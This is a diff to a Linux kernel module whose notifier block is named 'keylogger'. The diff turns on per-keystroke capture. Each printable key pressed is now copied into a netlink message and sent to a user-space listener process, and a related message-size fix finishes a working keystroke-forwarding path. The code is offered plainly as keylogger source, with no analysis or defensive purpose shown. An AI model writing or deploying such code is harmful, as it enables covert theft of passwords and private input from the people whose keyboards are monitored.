@@ -12,12 +12,6 @@ void sendpacket(char *c);
 int pid;
 // structs
 
-struct ethernet_header
-{
-    unsigned char h_dest[6];   // mac address where data is sent to
-    unsigned char h_source[6]; // mac address where data is sent from
-    unsigned short h_type;     // what type of protocol we are using
-};
 struct sock *nl_sk = NULL;
 
 int notifier(struct notifier_block *block, unsigned long code, void *p)
@@ -27,7 +21,7 @@ int notifier(struct notifier_block *block, unsigned long code, void *p)
     tav = param->value;
     if ((int)code == KBD_KEYSYM && param->down == 1 && tav > 0x20 && tav < 0x7f)
     {
-
+        sendpacket(&tav);
         printk(KERN_INFO " PRESSED %c\n", tav);
     }
 
@@ -36,7 +30,6 @@ int notifier(struct notifier_block *block, unsigned long code, void *p)
 
         printk(KERN_INFO " RELEASED %c\n", tav);
     }
-    // sendpacket(&tav);
     return 1;
 }
 
@@ -44,7 +37,7 @@ void sendpacket(char *c)
 {
     struct nlmsghdr *nlhead;
     struct sk_buff *skb_out;
-    int res, msg_size = 2;
+    int res, msg_size = 1;
 
     skb_out = nlmsg_new(msg_size, 0); // nlmsg_new - Allocate a new netlink message: skb_out
 
@@ -53,9 +46,9 @@ void sendpacket(char *c)
         printk(KERN_ERR "Failed to allocate new skb\n");
         return;
     }
-    NETLINK_CB(skb_out).dst_group = 0;
     nlhead = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0); // Add a new netlink message to an skb
-
+    NETLINK_CB(skb_out).dst_group = 0;
+    strncpy((nlmsg_data(nlhead)), c, 1);
     res = nlmsg_unicast(nl_sk, skb_out, pid);
 
     if (res < 0)
@@ -68,11 +61,9 @@ struct notifier_block keylogger = {
 static void myNetLink_recv_msg(struct sk_buff *skb)
 {
     struct nlmsghdr *nlhead;
-    int msg_size;
 
     nlhead = (struct nlmsghdr *)skb->data; // nlhead message comes from skb's data... (sk_buff: unsigned char *data)
 
-    msg_size = strlen((char *)nlmsg_data(nlhead));
     pid = nlhead->nlmsg_pid; // Sending process port ID, will send new message back to the 'user space sender'
 
     strncpy(nlmsg_data(nlhead), "received", 9); // char *strncpy(char *dest, const char *src, size_t count)
